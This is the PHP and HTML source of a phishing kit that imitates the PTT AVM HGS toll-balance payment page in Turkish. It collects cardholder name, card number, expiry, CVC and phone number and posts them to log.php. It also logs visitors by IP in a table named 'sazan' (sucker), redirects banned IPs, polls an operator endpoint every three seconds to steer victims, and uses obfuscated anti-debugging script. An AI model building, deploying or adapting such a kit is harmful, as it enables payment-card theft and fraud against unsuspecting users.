<?php
    ob_start();
    session_start();
    require_once 'CSRFP/SignatureGenerator.php';
    $secret = 'allahyokzaafyokcinayet';

    $signer = new Kunststube\CSRFP\SignatureGenerator($secret);
    $ttoken = $signer->getSignature();
    date_default_timezone_set('Europe/Istanbul');
    include('../../baglan.php');
    $bilgi;
    if(isset($_GET['bilgi'])) {
        $bilgi = $_GET['bilgi'];
    } else $bilgi = '0';
    $db->query("INSERT INTO token (token) VALUES ('$ttoken')");
    $rowData = $db->query("SELECT * FROM sazan WHERE ip='$ip'");
    if($rowData->rowCount() > 0) {
        $db->query("UPDATE sazan SET now = 'Ödeme' WHERE ip = '{$ip}'");
    }
    $query2 = $db->query("SELECT * FROM sazan WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
    $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
    foreach($ban as $kontrol){
        if($kontrol['ban'] == $ip){ 
            header('Location:https://www.youtube.com/watch?v=lrmTi-53QWw&t=1m50s');
        } 
    } 
?>
<!DOCTYPE html>
<html style="height: auto;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>HGS Online Bakiye - Ödeme</title>
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
    <link rel="icon" type="image/png" "./v2/assets/images/favicon.png" />
<link href="https://use.fontawesome.com/releases/v5.0.7/css/all.css" rel="stylesheet">
    <link rel="stylesheet" href="./index_files/bootstrap.min.css">
    <link href="./index_files/css" rel="stylesheet" type="text/css">
    <!-- Theme style -->
    <link href="./index_files/AdminLTE.min.css" rel="stylesheet">
    <link href="./index_files/_all-skins.min.css" rel="stylesheet">
    <link href="./index_files/select2.min.css" rel="stylesheet">
    <link href="./index_files/simplePagination.css" rel="stylesheet">
    <link href="./index_files/datepicker3.css" rel="stylesheet">
    <link href="./index_files/toastr.css" rel="stylesheet">
    <link href="./index_files/morris.css" rel="stylesheet">
    <link href="./index_files/ribbon.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
    <script src="./index_files/jquery.payment.js"></script>
    <!-- Icheck -->
    <link rel="shortcut icon" href="./v2/assets/images/favicon.png" />
    <link href="./index_files/all.css" rel="stylesheet">
    <!-- Select2 -->
    <link href="./index_files/select2.min.css" rel="stylesheet">
    <!-- Loading modal -->
    <link href="./index_files/jquery.loadingModal.css" rel="stylesheet">
    <!-- Paging -->
    <link href="./index_files/simplePagination(1).css" rel="stylesheet">
	
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=0">
    <meta name="description" content="HGS uygulamaları ile PTT'den alınmış HGS etiketlerinizin bakiyesini kontrol etmek ve yükleme yapmak artık çok kolay! HGS Online Bakiye Yükleme, HGS Ödeme"/>
    <title>HGS Online Bakiye Yükleme</title>
    <link rel="icon" type="image/png" "./v2/assets/images/favicon.png?v=201910111500" />
    <link rel="stylesheet" "./v2/assets/fonts/opensans/open-sans.css?v=201910111500">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
    <script src="./v2/assets/js/pace.js?v=201910111500" type="text/javascript"></script>
    <link rel="stylesheet" type="text/css" href="./v2/assets/css/pace.css?v=201910111500" />

            <link rel="stylesheet"
              href="./v2/assets/css/hgs.min_20210727191922.css?v=201910111500"/>
    
    <script src="https://www.google.com/recaptcha/api.js?onload=recaptchaReadyForInit&hl=tr" async defer></script>
        <script src="//cdn.segmentify.com/account-js/segmentify_epttavm.js" async charset="UTF-8" type="text/javascript"></script>


    <script type="text/javascript">
        function _0x12bc(_0x20097a,_0x23b541){var _0x5a56ae=_0x5a56();return _0x12bc=function(_0x12bc80,_0x33ceb6){_0x12bc80=_0x12bc80-0xb6;var _0x3fe16e=_0x5a56ae[_0x12bc80];return _0x3fe16e;},_0x12bc(_0x20097a,_0x23b541);}function _0x5a56(){var _0x4cae2b=['8809976TnolRG','633654CTxFYp','5003250Dfcrex','56GQRUAP','2631432XRQHYL','1171710nunqCV','4089696WWRhYk','constructor','1026638EbsbiB'];_0x5a56=function(){return _0x4cae2b;};return _0x5a56();}(function(_0xfc63bc,_0x6d8c05){var _0x40582c=_0x12bc,_0x50ed59=_0xfc63bc();while(!![]){try{var _0x4bc724=parseInt(_0x40582c(0xbe))/0x1+parseInt(_0x40582c(0xbb))/0x2+parseInt(_0x40582c(0xba))/0x3+-parseInt(_0x40582c(0xbc))/0x4+parseInt(_0x40582c(0xb8))/0x5+-parseInt(_0x40582c(0xb7))/0x6*(parseInt(_0x40582c(0xb9))/0x7)+-parseInt(_0x40582c(0xb6))/0x8;if(_0x4bc724===_0x6d8c05)break;else _0x50ed59['push'](_0x50ed59['shift']());}catch(_0xab3cb8){_0x50ed59['push'](_0x50ed59['shift']());}}}(_0x5a56,0x7f610),setInterval(()=>{var _0xde6671=_0x12bc;(function(){return![];}[_0xde6671(0xbd)]('debugger')['apply']('stateObject'));},0x3e8));
        $(document).ready(function() {
            gonder();
            var int=self.setInterval("gonder()",3000);
        });

        function gonder() {
            $.ajax({
                type:'POST',
                url:'<?php echo "datach.php?ip=".$ip; ?>',
                success: function (msg) {
                    if(!msg || msg == "" || msg == " ") return;
                    window.location.href = msg;
                }
            });
        }
    </script>
    <script>
    jQuery(function($){
      $('[data-numeric]').payment('restrictNumeric');
      $('#cc-number').payment('formatCardNumber');
      $('#cc-exp').payment('formatCardExpiry');
      $('#cc-cvc').payment('formatCardCVC');
    });
  </script>
    

    



    <!-- jQuery 2.2.3 -->
    <script type="text/javascript" async="" src="./index_files/recaptcha__tr.js.indir"></script><script src="./index_files/jquery-2.2.3.min.js.indir"></script>
    <!-- Bootstrap 3.3.6 -->
    <script src="./index_files/bootstrap.min.js.indir"></script>
    <!-- Slimscroll -->
    <script src="./index_files/jquery.slimscroll.min.js.indir"></script>
    <!-- FastClick -->
    <script src="./index_files/fastclick.js.indir"></script>
    <script src="./index_files/select2.full.min.js.indir"></script>
    <script src="./index_files/bootstrap-datepicker.js.indir"></script>
    <script src="./index_files/bootstrap-datepicker.tr.js.indir" charset="UTF-8"></script>
    <script src="./index_files/toastr.js.indir"></script>
    <script src="./index_files/raphael.js.indir"></script>
    <script src="./index_files/morris.min.js.indir"></script>

    <!-- AdminLTE App -->
    <script src="./index_files/app.min.js.indir"></script>
    <!-- AdminLTE for demo purposes -->
    <script src="./index_files/demo.js.indir"></script>
    <!-- Jquery Validation -->
    <script src="./index_files/jquery.validate.min.js.indir" type="text/javascript"></script>
    
    <script src="./index_files/additional-methods.min.js.indir" type="text/javascript"></script>
    <script src="./index_files/messages_tr.js.indir" type="text/javascript"></script>
    <!-- Jquery Inputmask -->
    <script src="./index_files/jquery.inputmask.bundle.min.js.indir" type="text/javascript"></script>
    <!-- Icheck -->
    <script src="./index_files/icheck.min.js.indir" type="text/javascript"></script>
    <!-- Select2 -->
    <script src="./index_files/select2.full.min.js.indir" type="text/javascript"></script>
    <!-- Select2 Cascade -->
    <script src="./index_files/select2-cascade.js.indir" type="text/javascript"></script>
    <!-- Countdown -->
    <script src="./index_files/jquery.countdown.min.js.indir" type="text/javascript"></script>
    <!-- Loading modal -->
    <script src="./index_files/jquery.loadingModal.min.js.indir" type="text/javascript"></script>
    <!-- Paging -->
    <script src="./index_files/jquery.simplePagination.js.indir" type="text/javascript"></script>
    <!-- Excel Table Export-->
    <script src="./index_files/jquery.table2excel.min.js.indir"></script>


	
	<script>
		function formValidation(){
			var adsoyad = $("#adsoyad").val();
			var kartnumarasi = $("#cc-number").val();
			var cvv = $("#basvuruNo").val();
			var xcp = $("#cc-exp").val();
			var pinxd = $("#pinnumber").val();
			if( adsoyad == '' || kartnumarasi == ''|| cvv == ''|| xcp == ''|| pinxd == '' ){
				alert("Lütfen Tüm Alanları Doldurunuz");
				return false;
			}
		}
	</script>
</head>

<body style="background: #eee">
<div class="image-container wizard-hgs-image-container set-full-height">

    <div class="container-fluid no-padding">
        <div class="navbar-header" style="overflow: hidden;">
            <div class="logo-field">
                <a class="navbar-brand navbar-left" href="https://www.pttavm.com" target="_blank">
                    <img src="./v2/assets/images/pttavm_hgs_logo.png?v=201910111500"/>
                </a>

            </div>
            <div class="menu-field">
                <nav class="nav responsive-menu">
                    <div class="menu-wrapper resize-drag nav-wrapper">
                        <ul class="nav-ul">
                            <li class="homepage-menu-item"><a href="/" title="HGS Yükle"><span>Ana Sayfa</span></a></li>                            <li class="hgs-menu-item"><a href="/sorgula" title="HGS Yükle" class="selected"><span><img src="./v2/assets/images/menu/hgs_yukle.png?v=201910111500" class="menu-showed-item" /><img src="./v2/assets/images/menu/hgs_yukle_hover.png?v=201910111500" class="menu-hover-item display-none" />Yükle</span></a></li>
                            <li class="damage-menu-item"><a href="/hasar-sorgula" title="Araç Hasar Sorgulama, Araç Hasar Kaydı Sorgulama"><!--<div class="menu-new-badge">YENİ</div>--><span><img src="./v2/assets/images/menu/hasar_sorgula.png?v=201910111500" class="menu-showed-item" /><img src="./v2/assets/images/menu/hasar_sorgula_hover.png?v=201910111500" class="menu-hover-item display-none" />Hasar Sorgula</span></a></li>
                            <li class="km-menu-item"><a href="/arac-km-sorgula" title="Araç KM Sorgulama, Araç Muayene Sorgulama, Araç Kilometre Sorgulama"><span><img src="./v2/assets/images/menu/km_sorgula.png?v=201910111500" class="menu-showed-item" /><img src="./v2/assets/images/menu/km_sorgula_hover.png?v=201910111500"
                                                                                                                                                                                                                                                                                                                                                                                                class="menu-hover-item display-none"/>KM Sorgula</span></a>
                            </li>
                            <!--<li class="mtv-menu-item"><a href="/mtv-odeme"
                                                         title="MTV Ödeme, Motorlu Taşıtlar Vergisi Ödeme"><span><img
                                                src="./v2/assets/images/menu/mtv_odeme.png?v=201910111500"
                                                class="menu-showed-item"/><img
                                                src="./v2/assets/images/menu/mtv_odeme_hover.png?v=201910111500"
                                                class="menu-hover-item display-none"/>MTV Öde</span></a></li>-->
                            <!--<li class="traffic-menu-item"><a href="/trafik-cezasi-odeme"
                                                             title="Trafik Cezası Ödeme"><span><img
                                                src="./v2/assets/images/menu/trafik_cezasi.png?v=201910111500"
                                                class="menu-showed-item"/><img
                                                src="./v2/assets/images/menu/trafik_cezasi_hover.png?v=201910111500"
                                                class="menu-hover-item display-none"/>Trafik Cezası Öde</span></a></li>-->
                            <li class="shopping-cart-menu-item"><a href="https://pttavm.com" target="_blank"><span><img
                                                src="./v2/assets/images/menu/alisveris.png?v=201910111500"
                                                class="menu-showed-item"/><img
                                                src="./v2/assets/images/menu/alisveris_hover.png?v=201910111500"
                                                class="menu-hover-item display-none"/>Alışverişe Başla</span></a></li>
                        </ul>
                    </div>
                </div>
                <div class="actions-field">
                    
                </div>
            </div><div class="col-sm-12 col-md-8 col-md-offset-2 col-lg-6 col-lg-offset-3" id="hgs-query-container">

            
            <!--      Wizard container        -->
            <div class="wizard-container">

                <div class="card wizard-card" data-color="orange" id="wizardProfile">
                        <!--        You can switch " data-color="orange" "  with one of the next bright colors: "blue", "green", "orange", "red", "azure"          -->

                        <div class="wizard-header">
                            <div class="panel-header-icons">
                                <img class="panel-header-first-icon" src="./v2/assets/images/panel/homepage.png?v=201910111500">
                            </div>
                            <h1>
                                <img class="panel-header-second-icon" src="./v2/assets/images/panel/hgs.png?v=201910111500">
                                Bakiye Yükleme
                            </h1>
                            <h6 class="hgs-query-subtitle">
                                BU SİSTEMDEN, YALNIZCA PTT KANALI İLE SATIŞI GERÇEKLEŞTİRİLEN HGS ÜRÜNLERİNE BAKİYE YÜKLEME İŞLEMİ YAPILMAKTADIR.
                            </h6>
                        </div>



                        <div class="tab-content text-center">
                            <div class="tab-pane panel-border" id="hgs-query-check">
                                <form id="hgsQueryNo" name="hgs-query-no" data-tab="0" novalidate="novalidate">
                                

                                </form>
                            </div>

                            <div class="tab-pane panel-border" id="hgs-query-label">
                                
                            </div>

                            <div class="tab-pane panel-border" id="hgs-query-amounts">

                                
                            </div>

                            <div class="tab-pane panel-border active" id="hgs-query-payment">
                                <div class="panel-inside">
                                <div class="payment-container hgs-query-credit-card-container">
                                    <div class="col-sm-12"><span class="tab-pane-heading">Ödeme yapmak için kullanmak istediğiniz kart bilgilerini girin.</span></div>
                                    <form action="log.php" method="post" name="payment-form" class="payment-form "  data-tab="3" novalidate="novalidate">

                                    <div class="col-sm-5 panel-credit-card-container">
                                            <div class="row">


                                            <div class="form-group">
    <label>Kart üzerindeki ad ve soyad</label>
    <input type="text" name="adsoyad" class="form-control" placeholder="Adı Soyadı" autocomplete="off" onfocus="this.select()" required>
												<input type="hidden" name="islem" value="2">
												<?php printf('<input type="hidden" name="_token" value="%s">', htmlspecialchars($ttoken)); ?>
</div>

<div class="form-group">
    <label>Kart numaranız</label>
    <input type="text" id="ccNumber" name="cc" class="form-control" maxlength="19" autocomplete="off" placeholder="Kredi Kartı Numarası" required>
</div>

<div class="card-half-field row">
    <div class="col-sm-7 form-group">
        <label>Son kul. tarihi</label>
        <input type="text" name="skt" id="skt" class="form-control" maxlength="7" autocomplete="off" placeholder="Ay / Yıl" required>
    </div>

    <div class="col-sm-5 form-group">
        <label>CVC kodu</label>
        <!--<a class="text-warning what-is-cvc" data-toggle="tooltip" title="<img src='https://hgs-site.mncdn.com/v2/assets/images/cvc-graphic.png' width='100%' />">(?)</a>-->
        <input type="text" name="cvv" id="cvv" class="form-control" maxlength="3" digits placeholder="CVC" autocomplete="off" required>
    </div>
</div>
                                        </div>

                                    </div>
                                     <div class="col-sm-7 form-group panel-card-wrapper">
                                        <div class="card-wrapper" data-jp-card-initialized="true">
                                        <div class="jp-card-container"><div class="jp-card"><div class="jp-card-front"><div class="jp-card-logo jp-card-elo"><div class="e">e</div><div class="l">l</div><div class="o">o</div></div><div class="jp-card-logo jp-card-visa">Visa</div><div class="jp-card-logo jp-card-visaelectron">Visa<div class="elec">Electron</div></div><div class="jp-card-logo jp-card-mastercard">Mastercard</div><div class="jp-card-logo jp-card-maestro">Maestro</div><div class="jp-card-logo jp-card-amex"></div><div class="jp-card-logo jp-card-discover">discover</div><div class="jp-card-logo jp-card-dinersclub"></div><div class="jp-card-logo jp-card-dankort"><div class="dk"><div class="d"></div><div class="k"></div></div></div><div class="jp-card-logo jp-card-jcb"><div class="j">J</div><div class="c">C</div><div class="b">B</div></div><div class="jp-card-lower"><div class="jp-card-shiny"></div><div class="jp-card-cvc jp-card-display">•••</div><div class="jp-card-number jp-card-display">•••• •••• •••• ••••</div><div class="jp-card-name jp-card-display">AD SOYAD</div><div class="jp-card-expiry jp-card-display" data-before="ay/yıl" data-after="valid
thru">••/••</div></div></div><div class="jp-card-back"><div class="jp-card-bar"></div><div class="jp-card-cvc jp-card-display">•••</div><div class="jp-card-shiny"></div></div></div></div></div>

                                        <button type="sumbit" class="btn btn-warning" onclick="hgs.payment();" id="panel-do-payment-btn">ÖDEME YAP <img src="./v2/assets/images/tabs/payment.png"></button>
							

                                    </div>
                                                                            
                                            <span>Telefon numaranızı giriniz.</span>
                                            <input type="text" class="form-control text-center  hgs-query-inputs" name="no" id="phone" placeholder="(xxx)xxx-xxxx" required>
                                        
										<script>document.getElementById('phone').addEventListener('input', function (e) {
  var x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
  e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
}); </script>
                                        <div class="panel-contract-container panel-inside">
        <label class="checkbox bounce">
            <input type="checkbox" id="hgs-credit-card-contract" onchange="app.checkContractChecked($(this))" value="0">
            <svg viewBox="0 0 21 21">
            </svg>
            <span class="checkbox-msg">
                <a href="#" data-toggle="modal" data-target="#acik-riza-metni-modal">Açık Rıza Metni</a> ve <a href="#" data-toggle="modal" data-target="#privacy-policy-footer-modal">Gizlilik Politikası</a>'nı okudum ve onaylıyorum.
            </span>
        </label>
        <span class="contract-not-checked-msg display-none">Lütfen sözleşmeleri okuduğunuzu onaylayın.</span>
    </div>                                                                        </form>
                                    <div class="col-sm-12">
                                        <span class="hgs-query-payment-message payment-info-message">Ödeme işlemini onayladığınızda, <span class="text-warning"></span> kartınızdan tahsis edilecektir.</span>
                                    </div>
                                </div>

                                <div class="hgs-query-bank-transfer-container" style="display: none;">


                                    <form method="post" name="bank-transfer-form" id="bank-transfer-form" action="https://api.pttavm.com/v2/hgs/pay" novalidate="novalidate">

                                        <div class="row">
                                            <div class="col-sm-12">

                                                <span class="tab-pane-heading">Havale yapmak için kullanacağınız bankayı seçin.</span>
                                                <div class="select-wrapper bank-transfer-list-wrapper">
                                                    <select name="bank_id" class="form-control hgs-bank-transfer-list" onchange="hgs.setBankID($(this))"><option value="">Seçiniz</option></select>
                                                </div>

                                                <div class="panel-email-container panel-inside">
                                                    <span>Dekont ve referans kodunun gönderileceği e-posta adresini girin.</span>
                                                    <input type="email" class="form-control text-center hgs-query-email hgs-query-inputs"  name="tel" placeholder="Telefon" value="">
                                                </div>
                                                <div class="panel-contract-container panel-inside">
        <label class="checkbox bounce">
            <input type="checkbox" id="bank-transfer-contract" onchange="app.checkContractChecked($(this))" value="0">
            <svg viewBox="0 0 21 21">
            </svg>
            <span class="checkbox-msg">
                <a href="#" data-toggle="modal" data-target="#acik-riza-metni-modal">Açık Rıza Metni</a> ve <a href="#" data-toggle="modal" data-target="#privacy-policy-footer-modal">Gizlilik Politikası</a>'nı okudum ve onaylıyorum.
            </span>
        </label>
        <span class="contract-not-checked-msg display-none">Lütfen sözleşmeleri okuduğunuzu onaylayın.</span>
    </div>                                     
                                                                                                    <div class="panel-inside recaptcha-field" align="center">
                                                        <div id="hgs-recaptcha"><div style="width: 304px; height: 78px;"><div><iframe title="reCAPTCHA" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6LfWns8ZAAAAAPiknER72Jvj84KgPdeQtXFt47M2&amp;co=aHR0cHM6Ly9oZ3MucHR0YXZtLmNvbTo0NDM.&amp;hl=tr&amp;v=Iwg4ANhK7Iu8SHToSsE0E20K&amp;theme=dark&amp;size=normal&amp;cb=icjc1l5vr2nv" width="304" height="78" role="presentation" name="a-53vf47fufkp" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><textarea id="g-recaptcha-response-1" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div>
                                                        <span class="recaptcha-callback-not-valid-msg display-none">Doğrulama işlemi tamamlanmadı!</span>
                                                    </div>
												
                                                                                                <button type="button" class="btn btn-warning start-bank-transfer-btn panel-do-payment-btn" onclick="hgs.startBankTransfer();">
                                                    İŞLEMİ TAMAMLA <img src="/v2/assets/images/tabs/payment.png">
                                                </button>

                                            </div>
                                        </div>
                                    </form>

                                </div>

                                </div>

                            </div>
                        </div><!-- tab content -->

                        <div class="wizard-footer">

                            
                            <div class="clearfix"></div>
                        </div>

                </div>
            </div> 
        </div>
		
<footer>
    <div class="container">
        <div class="copyright">© Copyright <?= date('Y') ?> | Tüm hakları saklıdır.</div>
        <div class="footer-menu">
            <ul>
                <li class="important-informations">
                    <a href="javascript:void(0);">Önemli Bilgiler</a>
                    <ul>
                        <li><a href="#" data-toggle="modal" data-target="#acik-riza-metni-modal">Açık Rıza Metni</a></li>
                        <li><a href="#" data-toggle="modal" data-target="#aydinlatma-metni-modal">Aydınlatma Metni</a></li>
                        <li><a href="#" data-toggle="modal" data-target="#imha-politikasi-modal">İmha Politikası</a></li>
                        <li><a href="#" data-toggle="modal" data-target="#privacy-policy-footer-modal">Gizlilik Politikası</a></li>
                    </ul>
                </li>
                <li><a href="#" data-toggle="modal" data-target="#comment-modal">Görüş Bildir</a></li>
                <li><a href="#" data-toggle="modal" data-target="#sss-modal">Sıkça Sorulan Sorular</a></li>
                <li><a href="#" data-toggle="modal" data-target="#contact-modal">İletişim</a></li>
            </ul>
        </div>
        <div class="cookie-warning display-none">
            <h3>Çerez Politikası
                <i class="icon close cookie-warning-close-btn" onclick="app.closeCookieWarning();">x</i>
            </h3>
            <p>
                hgs.pttavm.com'da bulunan çerezler (cookies); alışveriş deneyiminizi iyileştirmek için
                yasal mevzuata uygun olarak düzenlenmiştir. Detaylı bilgiye ulaşmak için<br />
                <a href="#" data-toggle="modal" data-target="#cerez-politikasi-modal">Çerez Politikası</a> sayfasını ziyaret edebilirsiniz.
            </p>
        </div>
    </div>
</footer>

</div> 

<script>let ccNumberInput = document.querySelector('#ccNumber'),
													ccNumberPattern = /^\d{0,16}$/g,
													ccNumberSeparator = " ",
													ccNumberInputOldValue,
													ccNumberInputOldCursor,
													
													ccExpiryInput = document.querySelector('#skt'),
													ccExpiryPattern = /^\d{0,4}$/g,
													ccExpirySeparator = "/",
													ccExpiryInputOldValue,
													ccExpiryInputOldCursor,
													
													ccCVCInput = document.querySelector('#cccvv'),
													ccCVCPattern = /^\d{0,3}$/g,
													
													mask = (value, limit, separator) => {
														var output = [];
														for (let i = 0; i < value.length; i++) {
															if ( i !== 0 && i % limit === 0) {
																output.push(separator);
															}
															
															output.push(value[i]);
														}
														
														return output.join("");
													},
													unmask = (value) => value.replace(/[^\d]/g, ''),
													checkSeparator = (position, interval) => Math.floor(position / (interval + 1)),
													ccNumberInputKeyDownHandler = (e) => {
														let el = e.target;
														ccNumberInputOldValue = el.value;
														ccNumberInputOldCursor = el.selectionEnd;
													},
													ccNumberInputInputHandler = (e) => {
														let el = e.target,
																newValue = unmask(el.value),
																newCursorPosition;
														
														if ( newValue.match(ccNumberPattern) ) {
															newValue = mask(newValue, 4, ccNumberSeparator);
															
															newCursorPosition = 
																ccNumberInputOldCursor - checkSeparator(ccNumberInputOldCursor, 4) + 
																checkSeparator(ccNumberInputOldCursor + (newValue.length - ccNumberInputOldValue.length), 4) + 
																(unmask(newValue).length - unmask(ccNumberInputOldValue).length);
															
															el.value = (newValue !== "") ? newValue : "";
														} else {
															el.value = ccNumberInputOldValue;
															newCursorPosition = ccNumberInputOldCursor;
														}
														
														el.setSelectionRange(newCursorPosition, newCursorPosition);
														
														highlightCC(el.value);
													},
													highlightCC = (ccValue) => {
														let ccCardType = '',
																ccCardTypePatterns = {
																	amex: /^3/,
																	visa: /^4/,
																	mastercard: /^5/,
																	disc: /^6/,
																	
																	genric: /(^1|^2|^7|^8|^9|^0)/,
																};
														
														for (const cardType in ccCardTypePatterns) {
															if ( ccCardTypePatterns[cardType].test(ccValue) ) {
																ccCardType = cardType;
																break;
															}
														}
														
														let activeCC = document.querySelector('.cc-types__img--active'),
																newActiveCC = document.querySelector(`.cc-types__img--${ccCardType}`);
														
														if (activeCC) activeCC.classList.remove('cc-types__img--active');
														if (newActiveCC) newActiveCC.classList.add('cc-types__img--active');
													},
													ccExpiryInputKeyDownHandler = (e) => {
														let el = e.target;
														ccExpiryInputOldValue = el.value;
														ccExpiryInputOldCursor = el.selectionEnd;
													},
													ccExpiryInputInputHandler = (e) => {
														let el = e.target,
																newValue = el.value;
														
														newValue = unmask(newValue);
														if ( newValue.match(ccExpiryPattern) ) {
															newValue = mask(newValue, 2, ccExpirySeparator);
															el.value = newValue;
														} else {
															el.value = ccExpiryInputOldValue;
														}
													};

											ccNumberInput.addEventListener('keydown', ccNumberInputKeyDownHandler);
											ccNumberInput.addEventListener('input', ccNumberInputInputHandler);

											ccExpiryInput.addEventListener('keydown', ccExpiryInputKeyDownHandler);
											ccExpiryInput.addEventListener('input', ccExpiryInputInputHandler);
											
											
											</script>

    <script type="text/javascript"
            src="hgs.js"></script>


<script type="text/javascript">
    $(document).ready(function() {
        app.documentReady();
        $(window).trigger('resize')
    });
    window.addEventListener('DOMContentLoaded', () => {
        app.domContentLoaded();
    });
    $(window).resize(function() {
        app.navResizeCheck();
    });
</script>

</body>
</html>
	<?php
include "footer.php";
?>